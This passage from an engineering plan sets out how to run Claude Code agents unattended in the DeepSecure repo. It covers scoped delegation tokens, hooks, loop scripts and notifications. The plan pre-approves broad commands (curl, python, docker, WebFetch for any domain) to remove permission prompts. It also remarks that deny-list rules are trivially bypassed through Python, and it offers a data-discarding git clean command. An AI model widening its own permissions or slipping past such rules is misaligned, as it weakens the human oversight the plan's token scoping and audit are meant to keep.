  └── requests delegation_token from DeepSecure Control Plane
        scope: [repo:read, pr:create, ci:retry]
        ttl: 1 hour
        agent_id: hermes-orchestrator-1

  Worker Agent (spawned by Hermes)
    └── receives attenuated token (subset of orchestrator's scope)
          scope: [repo:read, file:write:deeptrail-gateway/*]
          ttl: 30 minutes
    └── cannot escalate permissions
    └── all actions fully audited
    └── token auto-revoked on session end
```

This tests DeepSecure's core primitives under real conditions:
- **Execution-scoped authorization:** Tokens valid only for the current AFK session
- **Delegation chains:** Orchestrator → worker attenuation works correctly
- **Runtime governance:** Agents cannot exceed their granted scope
- **Auditability:** Every tool invocation traceable to a delegation chain
- **Revocation:** Kill one agent's access without affecting others
- **Bounded blast radius:** A compromised worker can't escalate to orchestrator-level access

The insight is not that Hermes is "the best coding framework" — it's that Hermes naturally creates the exact security/control problems DeepSecure is designed to solve, making it the highest-value internal deployment target.

---

## What DeepSecure Already Has

The repo has significant infrastructure for agent-assisted development:

| Category | What Exists | Status |
|----------|-------------|--------|
| **CLAUDE.md** | Comprehensive project guidance (~800+ lines) | Strong but too large (encyclopedia, not TOC) |
| **Skills** | `code-review-and-quality`, `run-tests` | 2 of 9 recommended categories |
| **Command Skills** | `pipeline`, `run-plan`, `breakdown-design`, `execute-task`, `run-batch`, `complete-task`, `verify-batch-completion`, `commit-push-pr`, `ship`, `debug`, `explore-codebase`, `create-workstream`, `create-batch-execution-plan`, `create-task-ticket`, `create-task-spec`, `create-design-doc`, `run-checks`, `review`, `security-audit`, `setup-worktrees`, `sync-worktree-status`, `update-claude-md`, `spec` | Extensive pipeline (23 commands) |
| **Agents** | `code-reviewer`, `security-auditor`, `test-engineer` | 3 agents, but plain markdown (no YAML frontmatter) |
| **Hooks** | `afterFileEdit`, `beforeShellExecution`, `stop` | Basic set -- missing 6+ AFK-critical hook types |
| **Worktree Guide** | `docs/WORKTREE_GUIDE.md` | Documented but manual |
| **Parallel Guide** | `docs/PARALLEL_EXECUTION_GUIDE.md` | Documented but manual |
| **Pipeline System** | Full plan-to-ship lifecycle with pre-flight checks | Solid L3 infrastructure |
| **Permissions** | Partial allowlist in `settings.local.json` | Incomplete, no AFK-specific security profile |

---

## What's Missing for AFK

| # | Gap | Impact | Reference Pattern |
|---|-----|--------|-------------------|
| 1 | No Ralph Wiggum loop | Can't iterate autonomously with fresh context | Matt Pocock, Huntley, Carson |
| 2 | No `afk-once.sh` (manual single-task) | Can't learn failure domains before automating | Huntley |
| 3 | No permission auto-approval for AFK | Agent stalls on every non-allowlisted command | Boris Cherny |
| 4 | No AFK-specific security profile | Broad allowlist risks secrets/network exposure | Claude Code Cheatsheet |
| 5 | No notification system | Don't know when agent is stuck or done | All practitioners |
| 6 | No `PostCompact` hook | Context loss during long sessions | Boris Cherny |
| 7 | No `PostToolUse` auto-format hook | CI failures from formatting issues | Boris Cherny |
| 8 | Missing hook events | No `SubagentStop`, `PreCompact`, `SessionEnd`, `afterTaskComplete` | Claude Code Cheatsheet |
| 9 | No `/babysit-pr` skill | PRs require manual CI babysitting | Thariq (Anthropic) |
| 10 | No `/autofix-pr` skill | CI failures and review comments require manual fixing | Noah Zweben (Anthropic) |
| 11 | No `/grill-me` skill | Specs may be underspecified before implementation | Matt Pocock |
| 12 | No `/verify-app` subagent | No end-to-end testing subagent | Boris Cherny |
| 13 | No `doc-gardener` agent | Skills and docs accumulate staleness without audit | Ryan Carson |
| 14 | No `ci-fixer` agent | CI failure diagnosis requires manual intervention | Prior pipeline analysis |
| 15 | No context engineering skill | No guidance on compaction, context feeding, MCP | Prior pipeline analysis |
| 16 | No automated worktree spawning | Parallel execution requires manual setup | Sandcastle (Matt Pocock) |
| 17 | CLAUDE.md too large | Excess token cost on every session, context pollution | OpenAI pattern |
| 18 | No `CODE_STANDARDS.md` split | Standards enforced during implementation (expensive) instead of review (cheap) | Matt Pocock |
| 19 | No Monitor tool usage | Not leveraging event-driven monitoring | Noah Zweben |
| 20 | Skills are markdown files only | Missing scripts, gotchas, assets in skill folders | Thariq's 9-category framework |
| 21 | Agent definitions lack YAML frontmatter | No `tools:`, `model:`, `isolation:` fields | Claude Code Cheatsheet |
| 22 | No model override in commands | Can't specify Opus for planning, Sonnet for implementation | Claude Code Cheatsheet |
| 23 | No `.afk/learnings.md` | AFK failures not systematically captured | Huntley |
| 24 | No TDD enforcement in `/execute-task` | Tasks don't enforce red-green-refactor cycle | Prior pipeline analysis |
| 25 | No anti-rationalization tables | Agents can rationalize skipping steps during AFK | Osmani pattern |
| 26 | No `/loop` command integration | Can't run cron-style repeating tasks | Boris Cherny |
| 27 | No `/schedule` integration | Can't schedule cloud-based recurring tasks | Noah Zweben |
| 28 | No agent-to-agent review pipeline | Human review still required for all PRs | OpenAI |
| 29 | No golden principles GC | No automated tech debt scanning | OpenAI |
| 30 | No machine-parseable completion tracking | Using markdown checklists instead of `passes: true/false` | Carson |
| 31 | No zero-trust AFK identity | Agents use static credentials, not scoped delegation_tokens | DeepSecure dog-fooding |
| 32 | No `/afk` toggle command | Switching AFK mode requires manual reconfiguration | OpenCode `opencode-afk` |
| 33 | No fast-merge policy | All PRs blocked on human review, bottleneck at scale | Dark Factory synthesis |
| 34 | No vulnerability scanning hook | Security issues can be committed during AFK | Bandit + safety integration |
| 35 | No keepalive mechanism | Long AFK sessions may be killed by idle timeouts | Tmux watchdog, session_keepalive |
| 36 | No skill `gotchas.md` files | Agents rediscover domain pitfalls on every run | Skill engineering discipline |
| 37 | No semantic deduplication | Agents may redo already-completed work | Pre-execution task matching |
| 38 | No skill quality scoring | No way to measure or improve skill effectiveness | Marketplace plugin rubrics |
| 39 | No `< /dev/null` in AFK scripts | Claude hangs waiting for stdin when run via nohup or & | Eva Khmelinskaya [22] |
| 40 | No `--max-budget-usd` cost ceiling | Overnight AFK runs can incur unlimited API costs | Claude Code CLI |
| 41 | No dirty-tree idempotency guard | Agent crash mid-task leaves dirty tree; next iteration reattempts on broken state | snarktank/ralph |
| 42 | No machine sleep/reboot recovery | `caffeinate` not used; no protocol for recovering partial state after laptop sleep | All overnight AFK practitioners |
| 43 | Ralph loop uses Markdown progress, not JSON | Models rewrite/summarize Markdown; JSON is more reliable for state tracking | Anthropic research [21], Carson [16] |
| 44 | Deny-list provides false security | Pattern-based denials are trivially bypassed via Python; need Docker sandbox | Ramp, Cursor, OpenAI |
| 45 | No sentinel completion detection | Loop checks progress file each iteration instead of immediate exit on `<promise>COMPLETE</promise>` | snarktank/ralph |
| 46 | No Dynamic Workflows integration | Claude Code's May 2026 feature (16 concurrent subagents) not leveraged | Anthropic [23] |
| 47 | No one-minute build rule | No constraint on build/test feedback loop duration | OpenAI Symphony [29] |
| 48 | Ralph loop bypasses /run-batch | Two parallel execution paths that will drift; need architectural decision | Internal review |
| 49 | Hook event names conflated | Doc uses PascalCase (`PostCompact`) but actual Claude Code uses `SessionStart` with `compact` matcher | Claude Code CLI verification |
| 50 | No phased session architecture | No time-boxing of sessions (30-60 min phases per Eva Khmelinskaya) | [22] |
| 51 | CLAUDE.md split breaks implicit loading | Referenced files not auto-loaded; need SessionStart hook as prerequisite | Internal review |

---

## Concrete Action Plan: Enabling AFK for DeepSecure

### Phase 1: Low-Hanging Fruit (Can Implement Today)

#### 1a. Permission Allowlisting

Expand `settings.local.json` to cover all safe development commands so AFK sessions don't stall on routine operations:

```json
{
  "permissions": {
    "allow": [
      "Bash(git:*)",
      "Bash(make:*)",
      "Bash(docker:*)",
      "Bash(docker compose:*)",
      "Bash(grep:*)",
      "Bash(ruff:*)",
      "Bash(black:*)",
      "Bash(isort:*)",
      "Bash(mypy:*)",
      "Bash(pytest:*)",
      "Bash(python:*)",
      "Bash(python3:*)",
      "Bash(pip:*)",
      "Bash(curl:*)",
      "Bash(gh:*)",
      "Bash(find:*)",
      "Bash(ls:*)",
      "Bash(cat:*)",
      "Bash(echo:*)",
      "Bash(wc:*)",
      "Bash(sort:*)",
      "Bash(head:*)",
      "Bash(tail:*)",
      "Bash(xargs:*)",
      "Bash(jq:*)",
      "Edit",
      "Write",
      "Read",
      "WebSearch",
      "WebFetch(domain:*)"
    ]
  }
}
```

**Effort:** 30 minutes | **Impact:** High -- unblocks all AFK work

#### 1b. Stop Hook Enhancement

Update the stop hook to nudge Claude to continue if tasks remain, preventing premature stopping (Boris Cherny's pattern):

```bash
#!/bin/bash
# .cursor/hooks/on-task-stop.sh (enhanced)

# Check if there are remaining tasks in any active workstream
for status_file in docs/workstreams/*/STATUS.md; do
  if [ -f "$status_file" ]; then
    REMAINING=$(grep -c "^|.*|.*Pending\||.*In Progress" "$status_file" 2>/dev/null || echo 0)
    if [ "$REMAINING" -gt 0 ]; then
      WORKSTREAM=$(dirname "$status_file" | xargs basename)
      echo "NOTICE: $REMAINING tasks still pending in workstream '$WORKSTREAM'. Consider continuing."
    fi
  fi
done

# Check Ralph progress if active (JSON format)
for progress_file in docs/workstreams/*/ralph_progress.json; do
  if [ -f "$progress_file" ]; then
    REMAINING=$(python3 -c "import json; d=json.load(open('$progress_file')); print(sum(1 for t in d['tasks'] if not t['passes'] and not t.get('blocked')))" 2>/dev/null || echo 0)
    if [ "$REMAINING" -gt 0 ]; then
      echo "NOTICE: $REMAINING Ralph tasks remaining. Don't stop yet."
    fi
  fi
done
```

**Effort:** 30 minutes | **Impact:** High -- prevents premature agent stopping

#### 1c. PostToolUse Auto-Format Hook

Auto-format Python files after every edit, eliminating CI formatting failures (Boris's top hook recommendation):

```json
{
  "hooks": {
    "PostToolUse": [
      {
        "matcher": {
          "tool_name": "Edit|Write"
        },
        "command": "FILE_PATH=$(echo $TOOL_INPUT | jq -r '.file_path // empty'); if [ -n \"$FILE_PATH\" ] && echo \"$FILE_PATH\" | grep -q '\\.py$'; then ruff format --quiet \"$FILE_PATH\" 2>/dev/null; isort --quiet \"$FILE_PATH\" 2>/dev/null; fi"
      }
    ]
  }
}
```

**Effort:** 1 hour | **Impact:** Medium -- eliminates a class of CI failures

#### 1d. Context Recovery via SessionStart Hook (Compact Matcher)

**IMPORTANT (May 2026 API verification):** Claude Code does NOT have separate `PostCompact` or `PreCompact` hook events. Instead, the `SessionStart` hook fires with a `source` field that can be `"startup"`, `"resume"`, `"clear"`, or `"compact"`. Use the `"compact"` matcher on `SessionStart` to re-inject context after compaction.

Re-inject critical context after Claude compresses its context window. This prevents "amnesia" during long AFK sessions:

```json
{
  "hooks": {
    "SessionStart": [
      {
        "matcher": "compact",
        "hooks": [{
          "type": "command",
          "command": "cat .claude/compact-recovery.md 2>/dev/null || true"
        }]
      }
    ]
  }
}
```

Whatever this command writes to stdout gets added to Claude's context after compaction. Create `.claude/compact-recovery.md` with the absolute minimum critical rules:
- Token type usage (User Token vs Agent JWT vs Internal Token)
- File path conventions (`app/` prefix for backend services)
- Test organization rules
- Current task context pointer
- Anti-rationalization reminders

**Effort:** 1 hour | **Impact:** Medium -- prevents context loss in long sessions

#### 1e. SessionStart Hook (Startup Matcher)

Load recent context at the beginning of every new session (Boris's pattern):

```json
{
  "hooks": {
    "SessionStart": [
      {
        "matcher": "startup",
        "hooks": [{
          "type": "command",
          "command": "echo '--- Recent commits ---'; git log --oneline -5 2>/dev/null; echo '--- Branch ---'; git branch --show-current 2>/dev/null; echo '--- Open PRs ---'; gh pr list --limit 3 2>/dev/null || true"
        }]
      }
    ]
  }
}
```

The `source` matchers: `"startup"` (new session), `"resume"` (continued session), `"clear"` (context cleared), `"compact"` (context compacted). Use different matchers for different behaviors — load more context on startup, re-inject critical rules on compact.

**Effort:** 30 minutes | **Impact:** Medium -- agents start with situational awareness

#### 1f. Notification Hook (Permission Prompts)

**IMPORTANT (May 2026 API verification):** Claude Code does NOT have a `PermissionRequest` hook event. Instead, the `Notification` hook fires with matchers including `"permission_prompt"`. Use this to get notified when the agent is blocked waiting for permission:

```json
{
  "hooks": {
    "Notification": [
      {
        "matcher": "permission_prompt",
        "hooks": [{
          "type": "command",
          "command": "osascript -e 'display notification \"Claude Code needs permission\" with title \"Claude Code\" sound name \"Glass\"' 2>/dev/null || true"
        }]
      }
    ]
  }
}
```

This replaces the incorrect `PermissionRequest` hook event documented in earlier versions of this document.

**Effort:** 15 minutes | **Impact:** High -- know immediately when agent is blocked during AFK

---

### Phase 1.5: Agent Frontmatter Upgrade

The 3 existing agents (`code-reviewer`, `test-engineer`, `security-auditor`) are plain markdown files. They need proper Claude Code subagent YAML frontmatter with `name:`, `description:`, `tools:`, `model:`, `isolation:` fields (per the Claude Code Cheatsheet format).

#### Before (current):

```markdown
# Code Reviewer Agent
You are a code reviewer for the DeepSecure project...
```

#### After (upgraded):

```markdown
---
name: code-reviewer
description: Reviews code changes for correctness, security, and style compliance
model: sonnet
tools:
  - Read
  - Bash(git:*)
  - Bash(ruff:*)
  - Bash(grep:*)
  - WebSearch
---

# Code Reviewer Agent

## Anti-Rationalization Table
| Agent Might Say | Why It's Wrong | Do This Instead |
|----------------|----------------|-----------------|
| "This change is too small to review" | Small changes cause big bugs | Review every change |
| "The tests pass so it's fine" | Tests don't catch all issues | Review logic, not just test results |
| "I'll note this for later" | Later never comes | Flag it now |

You are a code reviewer for the DeepSecure project...
```

#### Model Selection Strategy

| Agent Role | Recommended Model | Rationale |
|-----------|-------------------|-----------|
| Planning / architecture | `opus` | Needs deep reasoning for design decisions |
| Code review | `sonnet` | Good balance of speed and quality for diffs |
| Implementation / task execution | `sonnet` | Fast iteration, good enough for scoped tasks |
| Security audit | `opus` | Security requires thorough reasoning |
| Test generation | `sonnet` | Formulaic enough for fast model |
| Doc gardening | `haiku` | Simple comparison tasks, high volume |

**Files to update:**
- `.claude/agents/code-reviewer.md`
- `.claude/agents/security-auditor.md`
- `.claude/agents/test-engineer.md`

**Effort:** 2 hours | **Impact:** Medium -- agents get correct tool access and model selection

---

### Phase 2: Ralph Wiggum Loop for DeepSecure

The Ralph Wiggum pattern is the core engine for AFK execution. Each iteration gets a fresh context window, reads progress, implements the next task, and commits.

#### Step 2a: Manual Single-Task Script (Start Here)

Per Huntley's "manual first" principle, start with a single-iteration script before the full loop:

```bash
#!/bin/bash
# scripts/afk-once.sh - Single AFK task execution (manual stepping stone)
# Usage: ./scripts/afk-once.sh <workstream-name>
#
# Run this manually first. Watch the output. Learn the failure domains.
# Only move to ralph.sh after you've done 5-10 successful afk-once runs.

set -euo pipefail

WORKSTREAM=${1:?"Usage: afk-once.sh <workstream-name>"}
PROGRESS_FILE="docs/workstreams/$WORKSTREAM/ralph_progress.json"
PROMPT_FILE="docs/workstreams/$WORKSTREAM/ralph-prompt.md"
MAX_BUDGET=${RALPH_MAX_BUDGET:-5.00}

# --- Prerequisite checks ---
if [ ! -f "$PROGRESS_FILE" ]; then
  echo "ERROR: $PROGRESS_FILE not found."
  echo "Create it with the JSON progress template (see Step 2d)."
  exit 1
fi

if [ ! -f "$PROMPT_FILE" ]; then
  echo "ERROR: $PROMPT_FILE not found."
  exit 1
fi

# --- Dirty-tree idempotency guard (GAP #41 fix) ---
DIRTY=$(git status --short 2>/dev/null | head -5)
if [ -n "$DIRTY" ]; then
  echo "WARNING: Working tree is dirty. A previous iteration may have crashed mid-task."
  echo "$DIRTY"
  echo ""
  echo "Options:"
  echo "  1. Review and commit: git add -A && git commit -m 'WIP: partial task from crashed iteration'"
  echo "  2. Discard changes:   git checkout -- . && git clean -fd"
  echo "  3. Stash and continue: git stash"
  echo ""
  read -p "Stash and continue? [y/N] " -n 1 -r
  echo ""
  if [[ $REPLY =~ ^[Yy]$ ]]; then
    git stash push -m "afk-once: dirty tree stash $(date +%Y%m%d_%H%M%S)"
    echo "Stashed. Continuing..."
  else
    echo "Aborting. Clean the tree manually before retrying."
    exit 1
  fi
fi

REMAINING=$(python3 -c "import json; tasks=json.load(open('$PROGRESS_FILE')); print(sum(1 for t in tasks['tasks'] if not t['passes'] and not t.get('blocked')))" 2>/dev/null || echo 0)
echo "Tasks remaining: $REMAINING"
echo "Max budget: \$$MAX_BUDGET"
echo "Running single iteration..."
echo ""

claude --print \
  --output-format json \
  --prompt-file "$PROMPT_FILE" \
  --allowedTools "Edit,Write,Read,Bash(git:*),Bash(pytest:*),Bash(make:*),Bash(ruff:*),Bash(python:*),Bash(python3:*),Bash(mypy:*),Bash(black:*),Bash(isort:*),Bash(find:*),Bash(grep:*),Bash(ls:*),Bash(cat:*),Bash(docker:*),Bash(docker compose:*)" \
  --max-turns 80 \
  --max-budget-usd "$MAX_BUDGET" \
  --append-system-prompt "Read $PROGRESS_FILE (JSON format). Find the FIRST task where passes=false and blocked=null. Implement it fully. Run tests to verify. If tests pass, git add and commit. Then update $PROGRESS_FILE: set passes=true for the completed task. If tests fail after 3 attempts, set blocked='<reason>' for that task. When ALL tasks have passes=true, output the sentinel: <promise>COMPLETE</promise>"

echo ""
echo "=== Iteration complete ==="
echo "Review the changes: git log -1 --stat"
echo "Check progress: python3 -c \"import json; d=json.load(open('$PROGRESS_FILE')); print(f'Done: {sum(1 for t in d[\\\"tasks\\\"] if t[\\\"passes\\\"])} / {len(d[\\\"tasks\\\"])}')\""
echo ""
echo "Satisfied? Run again, or graduate to: ./scripts/ralph.sh $WORKSTREAM"
```

#### Step 2b: Full Ralph Loop Script

Only use this after you've done 5-10 successful `afk-once.sh` runs:

```bash
#!/bin/bash
# scripts/ralph.sh - AFK batch executor for DeepSecure
# Usage: ./scripts/ralph.sh <workstream-name> [max-iterations]
#
# Prerequisites:
#   - Workstream must exist in docs/workstreams/<name>/
#   - ralph_progress.json must exist with task list (JSON format)
#   - Tests must be runnable via `make test` or `pytest`
#   - You have done 5+ successful afk-once.sh runs first

set -euo pipefail

WORKSTREAM=${1:?"Usage: ralph.sh <workstream-name> [max-iterations]"}
MAX_ITERATIONS=${2:-10}
PROGRESS_FILE="docs/workstreams/$WORKSTREAM/ralph_progress.json"
PROMPT_FILE="docs/workstreams/$WORKSTREAM/ralph-prompt.md"
LOG_DIR="docs/workstreams/$WORKSTREAM/ralph-logs"
LEARNINGS_FILE=".afk/learnings.md"
MAX_BUDGET=${RALPH_MAX_BUDGET:-5.00}

# Validate prerequisites
if [ ! -f "$PROGRESS_FILE" ]; then
  echo "ERROR: $PROGRESS_FILE not found. Create it with the JSON progress template (see Step 2d)."
  exit 1
fi

if [ ! -f "$PROMPT_FILE" ]; then
  echo "ERROR: $PROMPT_FILE not found. Create the Ralph prompt first."
  exit 1
fi

# Validate JSON is parseable
if ! python3 -c "import json; json.load(open('$PROGRESS_FILE'))" 2>/dev/null; then
  echo "ERROR: $PROGRESS_FILE is not valid JSON."
  exit 1
fi

mkdir -p "$LOG_DIR"
mkdir -p "$(dirname "$LEARNINGS_FILE")"
touch "$LEARNINGS_FILE"

# --- Prevent machine sleep (macOS) (GAP #42 fix) ---
if command -v caffeinate &>/dev/null; then
  caffeinate -i -w $$ &
  CAFFEINATE_PID=$!
  echo "Sleep prevention: caffeinate started (PID: $CAFFEINATE_PID)"
fi

echo "=== Ralph Wiggum Loop ==="
echo "Workstream: $WORKSTREAM"
echo "Max iterations: $MAX_ITERATIONS"
echo "Progress file: $PROGRESS_FILE (JSON)"
echo "Max budget per iteration: \$$MAX_BUDGET"
echo "Learnings: $LEARNINGS_FILE"
echo "Started: $(date)"
echo ""

FAILURES=0

for i in $(seq 1 $MAX_ITERATIONS); do
  TIMESTAMP=$(date +%Y%m%d_%H%M%S)
  LOG_FILE="$LOG_DIR/iteration_${i}_${TIMESTAMP}.log"

  echo "--- Iteration $i/$MAX_ITERATIONS ($(date)) ---"

  # Check if all tasks complete before starting (JSON query)
  REMAINING=$(python3 -c "import json; tasks=json.load(open('$PROGRESS_FILE')); print(sum(1 for t in tasks['tasks'] if not t['passes'] and not t.get('blocked')))" 2>/dev/null || echo 0)
  if [ "$REMAINING" -eq 0 ]; then
    echo "All tasks complete! Stopping."
    scripts/notify.sh "Ralph [$WORKSTREAM]" "ALL TASKS COMPLETE! Run finished." "urgent" 2>/dev/null || \
      osascript -e 'display notification "All tasks complete!" with title "Ralph Finished" sound name "Glass"' 2>/dev/null || true
    break
  fi

  echo "Tasks remaining: $REMAINING"

  # --- Dirty-tree idempotency guard (GAP #41 fix) ---
  DIRTY=$(git status --short 2>/dev/null | head -5)
  if [ -n "$DIRTY" ]; then
    echo "WARNING: Dirty tree detected (likely crashed iteration). Auto-stashing..."
    git stash push -m "ralph: auto-stash iteration $i $(date +%Y%m%d_%H%M%S)" 2>/dev/null || true
  fi

  # Run Claude with fresh context
  # CRITICAL: < /dev/null prevents stdin hang in background execution (GAP #39 fix)
  if OUTPUT=$(claude --print \
    --output-format json \
    --prompt-file "$PROMPT_FILE" \
    --allowedTools "Edit,Write,Read,Bash(git:*),Bash(pytest:*),Bash(make:*),Bash(ruff:*),Bash(python:*),Bash(python3:*),Bash(mypy:*),Bash(black:*),Bash(isort:*),Bash(find:*),Bash(grep:*),Bash(ls:*),Bash(cat:*),Bash(docker:*),Bash(docker compose:*)" \
    --max-turns 80 \
    --max-budget-usd "$MAX_BUDGET" \
    --append-system-prompt "Read $PROGRESS_FILE (JSON format). Find the FIRST task where passes=false and blocked=null. Implement it fully. Run tests to verify. If tests pass, git add and commit with a descriptive message. Then update $PROGRESS_FILE: set passes=true for the completed task. If tests fail after 3 attempts, set blocked='<reason>' for that task. When ALL tasks have passes=true, output the sentinel: <promise>COMPLETE</promise>" \
    < /dev/null 2>&1 | tee "$LOG_FILE"); then
    FAILURES=0

    # Sentinel completion detection (GAP #45 fix) — exit immediately if agent signals done
    if echo "$OUTPUT" | grep -q "<promise>COMPLETE</promise>"; then
      echo "Agent signaled COMPLETE. All tasks done!"
      scripts/notify.sh "Ralph [$WORKSTREAM]" "ALL TASKS COMPLETE! Agent signaled done." "urgent" 2>/dev/null || \
        osascript -e 'display notification "All tasks complete!" with title "Ralph Finished" sound name "Glass"' 2>/dev/null || true
      break
    fi
  else
    FAILURES=$((FAILURES + 1))
    echo "$(date): Iteration $i failed (consecutive failures: $FAILURES)" >> "$LEARNINGS_FILE"
    if [ "$FAILURES" -ge 3 ]; then
      echo "3 consecutive failures. Stopping and notifying."
      scripts/notify.sh "Ralph [$WORKSTREAM]" "STOPPED: 3 consecutive failures. Check $LEARNINGS_FILE" "urgent" 2>/dev/null || true
      break
    fi
  fi

  # Notify progress
  scripts/notify.sh "Ralph [$WORKSTREAM]" "Iteration $i done. $REMAINING tasks remaining." 2>/dev/null || true

  echo "Iteration $i complete. Sleeping 5 seconds before next iteration..."
  sleep 5
done

echo ""
echo "=== Ralph Loop Complete ==="
echo "Finished: $(date)"
echo "Check progress: python3 -c \"import json; d=json.load(open('$PROGRESS_FILE')); done=sum(1 for t in d['tasks'] if t['passes']); blocked=sum(1 for t in d['tasks'] if t.get('blocked')); print(f'Done: {done}, Remaining: {len(d[\\\"tasks\\\"])-done-blocked}, Blocked: {blocked}')\""
echo "Check learnings: cat $LEARNINGS_FILE"

# Final notification
STATS=$(python3 -c "
import json
d = json.load(open('$PROGRESS_FILE'))
done = sum(1 for t in d['tasks'] if t['passes'])
blocked = sum(1 for t in d['tasks'] if t.get('blocked'))
remaining = len(d['tasks']) - done - blocked
print(f'Done: {done}, Remaining: {remaining}, Blocked: {blocked}')
" 2>/dev/null || echo "unknown")
scripts/notify.sh "Ralph Finished ($WORKSTREAM)" "$STATS" "urgent" 2>/dev/null || \
  osascript -e "display notification \"$STATS\" with title \"Ralph Finished\" sound name \"Glass\"" 2>/dev/null || true

# Cleanup caffeinate
[ -n "${CAFFEINATE_PID:-}" ] && kill "$CAFFEINATE_PID" 2>/dev/null || true
```

#### Step 2c: Learnings File

Create `.afk/learnings.md` to capture failures systematically:

```markdown
# AFK Learnings

Failures observed during AFK loop execution. Each entry should lead to a
fix in CLAUDE.md, skills, or hooks so the failure class never recurs.

## Template
```
### YYYY-MM-DD: <short description>
**Symptom:** What went wrong
**Root cause:** Why it went wrong
**Fix applied:** What was changed (CLAUDE.md rule, hook, skill update)
**Prevents:** What class of failure this fix prevents
```

## Entries
(Populated by developers observing AFK loop failures)
```

#### Step 2d: JSON Progress File Template (Replaces Markdown Checklist)

**Why JSON instead of Markdown (Principle 12):** Anthropic's harness engineering research found that models are less likely to inappropriately modify structured JSON compared to Markdown. Markdown checklists get rewritten, re-summarized, or malformed during updates. JSON parse errors are immediately detectable. Carson's `prd.json` with boolean `passes` fields is the proven pattern.

Create `docs/workstreams/<name>/ralph_progress.json`:

```json
{
  "workstream": "<workstream-name>",
  "created": "2026-05-29",
  "tasks": [
    {
      "id": "WS-A1",
      "description": "Create auth endpoint",
      "ticket": "docs/workstreams/<name>/tasks/WS-A1.md",
      "passes": false,
      "blocked": null
    },
    {
      "id": "WS-A2",
      "description": "Add JWT validation",
      "ticket": "docs/workstreams/<name>/tasks/WS-A2.md",
      "passes": false,
      "blocked": null
    },
    {
      "id": "WS-B1",
      "description": "Gateway routing",
      "ticket": "docs/workstreams/<name>/tasks/WS-B1.md",
      "passes": false,
      "blocked": null
    }
  ],
  "sentinel": "<promise>COMPLETE</promise>"
}
```

**Field semantics:**
- `passes: false` → not yet implemented
- `passes: true` → implemented and tests pass
- `blocked: null` → not blocked
- `blocked: "reason string"` → failed after 3 attempts, moved to blocked
- `sentinel` → the agent outputs this string when all tasks have `passes: true`

**Script helpers:**
```bash
# Count remaining tasks
python3 -c "import json; d=json.load(open('ralph_progress.json')); print(sum(1 for t in d['tasks'] if not t['passes'] and not t.get('blocked')))"

# List blocked tasks
python3 -c "import json; d=json.load(open('ralph_progress.json')); [print(f'{t[\"id\"]}: {t[\"blocked\"]}') for t in d['tasks'] if t.get('blocked')]"

# Check if all done
python3 -c "import json; d=json.load(open('ralph_progress.json')); print('COMPLETE' if all(t['passes'] for t in d['tasks']) else 'IN PROGRESS')"
```

#### Ralph Prompt Template

Create `docs/workstreams/<name>/ralph-prompt.md` for each workstream:

```markdown
# Ralph Prompt: <Workstream Name>

You are implementing tasks for the DeepSecure <workstream> workstream.

## Context
- Project: DeepSecure -- Identity-as-Code for AI agents
- Read CLAUDE.md for project conventions
- Read docs/workstreams/<name>/ralph_progress.json for the task list (JSON format)

## Your Mission
1. Read ralph_progress.json
2. Find the FIRST task where `passes` is `false` and `blocked` is `null`
3. Read the linked task ticket if one exists (the `ticket` field)
4. Implement the task fully using TDD:
   a. Write a failing test first (red)
   b. Implement the minimum code to pass (green)
   c. Refactor if needed
5. Run `pytest` on affected tests
6. Run `ruff check` on modified files
7. If all checks pass: `git add` changed files and `git commit`
8. Update ralph_progress.json: set `passes` to `true` for the completed task
9. If tests fail after 3 fix attempts: set `blocked` to a reason string for that task
10. If ALL tasks have `passes: true`, output: `<promise>COMPLETE</promise>`

## Anti-Rationalization Table
| You Might Think | Why It's Wrong | Do This Instead |
|----------------|----------------|-----------------|
| "Tests aren't needed for this change" | Every change needs tests in this repo | Write at least one test |
| "I'll fix the lint errors later" | Later never comes in AFK mode | Fix before committing |
| "This is close enough" | Close enough fails in CI | Match the spec exactly |
| "I can skip the TDD cycle for this" | TDD is mandatory, not optional | Red-green-refactor every time |

## Rules
- One task per iteration (you will be re-invoked for the next task)
- Do not modify tasks you are not currently implementing
- Always run tests before committing
- Never commit with failing tests
- Follow the existing code patterns in the codebase
- Follow TDD: write test first, then implementation
```

#### Ralph Progress File Template

**DEPRECATED: Markdown checklists.** Use `ralph_progress.json` (see Step 2d above) instead. See Principle 12 for why JSON is preferred over Markdown for agent state tracking.

**Effort:** 4 hours | **Impact:** Very High -- core AFK execution engine with manual stepping stone, dirty-tree guard, JSON progress, sentinel detection, cost ceiling, and sleep prevention

---

### Phase 3: Notification System

#### 3a. Unified Notification Script

```bash
#!/bin/bash
# scripts/notify.sh - Unified notification sender
TITLE=${1:-"DeepSecure"}
MESSAGE=${2:-"Agent needs attention"}
URGENCY=${3:-"normal"}  # normal, urgent

# macOS notification
osascript -e "display notification \"$MESSAGE\" with title \"$TITLE\" sound name \"Glass\"" 2>/dev/null || true

# Slack webhook (if configured)
if [ -n "$DEEPSECURE_SLACK_WEBHOOK" ]; then
  EMOJI=":robot_face:"
  [ "$URGENCY" = "urgent" ] && EMOJI=":rotating_light:"
  curl -s -X POST "$DEEPSECURE_SLACK_WEBHOOK" \
    -H 'Content-Type: application/json' \
    -d "{\"text\": \"$EMOJI *$TITLE*: $MESSAGE\"}" > /dev/null 2>&1
fi
```

#### 3b. Slack Webhook Setup

```bash
# Set in .env or shell profile
export DEEPSECURE_SLACK_WEBHOOK="https://hooks.slack.com/services/YOUR/WEBHOOK/URL"
```

#### 3c. Permission Prompt Notification Hook

**IMPORTANT (May 2026 API correction):** Claude Code does NOT have a `PermissionRequest` hook event. Use the `Notification` hook with `permission_prompt` matcher instead:

```json
{
  "hooks": {
    "Notification": [
      {
        "matcher": "permission_prompt",
        "hooks": [{
          "type": "command",
          "command": "scripts/notify.sh 'Permission Blocked' 'Claude Code is waiting for permission approval' urgent"
        }]
      }
    ]
  }
}
```

This fires whenever the agent hits a command not covered by the allowlist and is waiting for human approval. During AFK, this is your signal to check in — either approve the action via Remote Control (Noah Zweben's pattern) or expand the allowlist for next time.

#### 3d. Integration with Ralph Loop

Already integrated into the `ralph.sh` script in Phase 2 -- sends notifications on iteration completion, all-tasks-done, and consecutive failures.

#### 3e. Cross-Platform Notification Support

The current `notify.sh` is macOS-only (`osascript`) with Slack webhook as the only cross-platform option. For broader support:

```bash
#!/bin/bash
# scripts/notify.sh - Unified notification sender (cross-platform)
TITLE=${1:-"DeepSecure"}
MESSAGE=${2:-"Agent needs attention"}
URGENCY=${3:-"normal"}  # normal, urgent

# macOS notification
if command -v osascript &>/dev/null; then
  osascript -e "display notification \"$MESSAGE\" with title \"$TITLE\" sound name \"Glass\"" 2>/dev/null || true
fi

